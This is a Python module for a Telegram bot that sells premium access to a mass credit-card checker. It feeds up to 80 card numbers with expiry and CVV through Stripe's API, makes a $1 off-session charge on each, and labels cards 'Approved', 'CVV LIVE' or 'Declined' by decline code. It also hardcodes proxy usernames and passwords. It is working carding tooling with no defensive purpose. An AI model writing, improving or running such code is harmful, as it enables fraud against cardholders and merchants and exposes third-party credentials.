import time
import re
import aiohttp
import json
import random
import asyncio
from EQUROBOT import app
from pyrogram import filters
from collections import defaultdict
from EQUROBOT.core.mongo import has_premium_access, check_keys
from EQUROBOT.modules.CHECKER import sk_set
from config import OWNER_ID


DEFAULT_AMOUNT = 1
user_request_times = defaultdict(list)
CARD_PATTERN = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


proxy_list = [
    "purevpn0s4931691:jm3s6om1bfbd@prox-cl.pointtoserver.com:10799",
    "tickets:proxyon145@23.104.162.39:12345",
    "tickets:proxyon145@107.173.112.245:12345",
    "purevpn0s607365:5whkx7x6o7c1@prox-ar.pointtoserver.com:10799",
    "tickets:proxyon145@5.157.5.100:12345",
    "tickets:proxyon145@23.94.4.206:12345",
    "purevpn0s607365:5whkx7x6o7c1@prox-af.pointtoserver.com:10799",
    "purevpn0s4931691:jm3s6om1bfbd@prox-bo.pointtoserver.com:10799",
    "tickets:proxyon145@104.206.81.209:12345"
]


async def check_card(session, card_info, charge_amount, proxy, sk, pk):
    card = card_info.strip()
    if not card:
        return f"❌ **Invalid card details** for `{card_info}`"

    proxy_url = random.choice(proxy_list)

    split = card.split("|")
    if len(split) != 4:
        return f"❌ **Invalid card details** for `{card}`"

    cc, mes, ano, cvv = split

    token_data = {
        'type': 'card',
        "card[number]": cc,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "card[cvc]": cvv,
    }

    headers = {
        "Authorization": f"Bearer {pk}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    async with session.post("https://api.stripe.com/v1/payment_methods", data=token_data, headers=headers) as response:
        if response.status != 200:
            try:
                error_message = (await response.json()).get("error", {}).get("message", "Unknown error")
            except json.JSONDecodeError:
                error_message = "Unknown error"
            return f"❌ **Token creation failed** for `{card}`: {error_message}"

        token_data = await response.json()
        token_id = token_data.get("id", "")
        if not token_id:
            return f"❌ **Token creation failed** for `{card}`"

    charge_data = {
        "amount": int(charge_amount) * 100,
        "currency": "usd",
        'payment_method_types[]': 'card',
        "description": "Charge for product/service",
        'payment_method': token_id,
        'confirm': 'true',
        'off_session': 'true'
    }

    headers = {
        "Authorization": f"Bearer {sk}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    async with session.post("https://api.stripe.com/v1/payment_intents", data=charge_data, headers=headers) as response:
        charges = await response.text()

    try:
        charges_dict = json.loads(charges)
        charge_error = charges_dict.get("error", {}).get("decline_code", "Unknown error")
        charge_message = charges_dict.get("error", {}).get("message", "No message available")
    except json.JSONDecodeError:
        charge_error = "Unknown error (Invalid JSON response)"
        charge_message = "No message available"

    if '"status": "succeeded"' in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = f"Charged {charge_amount}$🔥"
    elif '"cvc_check": "pass"' in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = "CVV LIVE❎"
    elif "generic_decline" in charges:
        status = "Declined ❌"
        resp = "Generic Decline"
    elif "insufficient_funds" in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = "Insufficient funds 💰"
    elif "fraudulent" in charges:
        status = "Declined ❌"
        resp = "Fraudulent"
    elif "do_not_honor" in charges:
        status = "Declined ❌"
        resp = "Do Not Honor"
    elif '"code": "incorrect_cvc"' in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = "Security code (CVC) is Incorrect."
    elif "invalid_expiry_month" in charges:
        status = "Declined ❌"
        resp = "The card expiration date provided is invalid."
    elif "invalid_account" in charges:
        status = "Declined ❌"
        resp = "The account linked to the card is invalid."
    elif "lost_card" in charges:
        status = "Declined ❌"
        resp = "The card has been reported as lost and the transaction was declined."
    elif "stolen_card" in charges:
        status = "Declined ❌"
        resp = "The card has been reported as stolen and the transaction was declined."
    elif "transaction_not_allowed" in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = "Transaction Not Allowed ❎"
    elif "authentication_required" in charges or "card_error_authentication_required" in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = "3D Secured ❎"
    elif "pickup_card" in charges:
        status = "Declined ❌"
        resp = "Pickup Card"
    elif "Your card has expired." in charges:
        status = "Declined ❌"
        resp = "Expired Card"
    elif "card_decline_rate_limit_exceeded" in charges:
        status = "Declined ❌"
        resp = "Rate limit"
    elif '"code": "processing_error"' in charges:
        status = "Declined ❌"
        resp = "Processing error"
    elif '"message": "Your card number is incorrect."' in charges:
        status = "Declined ❌"
        resp = "Your card number is incorrect."
    elif "incorrect_number" in charges:
        status = "Declined ❌"
        resp = "Card number is invalid."
    elif "testmode_charges_only" in charges:
        status = "Declined ❌"
        resp = "The SK key is in test mode or invalid. Please use a valid key."
    elif "api_key_expired" in charges:
        status = "Declined ❌"
        resp = "The API key used for the transaction has expired."
    elif "parameter_invalid_empty" in charges:
        status = "Declined ❌"
        resp = "Please enter valid card details to check."
    else:
        status = f"{charge_error}"
        resp = f"{charge_message}"

    return f"𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"

async def check_cards_in_batches(cards_info, charge_amount, sk, pk):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for card in cards_info:
            proxy = random.choice(proxy_list)
            tasks.append(check_card(session, card, charge_amount, proxy, sk, pk))

        results = await asyncio.gather(*tasks)
        return "\n".join(results)


@app.on_message(filters.command("xxvv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    
    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
    
    try:
        cards_info = message.text.split(maxsplit=1)[1].strip().split("\n")
    except IndexError:
        await message.reply("Please provide card details in the format: `card_number|mm|yy|cvv`")
        return
    for card_info in cards_info:
        if not CARD_PATTERN.fullmatch(card_info.strip()):
            await message.reply(
                "Please provide the card details in the format: `card_number|mm|yy|cvv`."
            )
            return

    card_limit = 80

    if len(cards_info) > card_limit:
        await message.reply(
            f"You can check up to {card_limit} cards at a time. Please reduce the number of cards."
        )
        return
    
    sk, pk, mt = await check_keys()

    if not sk or not pk:
        await message.reply("Secret keys are not set. Please set them first.")
        return
    
    charge_amount = DEFAULT_AMOUNT
    processing_msg = await message.reply("Processing your request...")

    start_time = time.time()

    response = await check_cards_in_batches(cards_info, charge_amount, sk, pk)
    elapsed_time = round(time.time() - start_time, 2)

    await processing_msg.edit_text(
        text=f"𝗠𝗮𝘀𝘀 𝗦𝗸 𝗕𝗮𝘀𝗲 {charge_amount}$\n\n{response}\n"
        f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
        f"𝗧𝗶𝗺𝗲: {elapsed_time} seconds"
    )
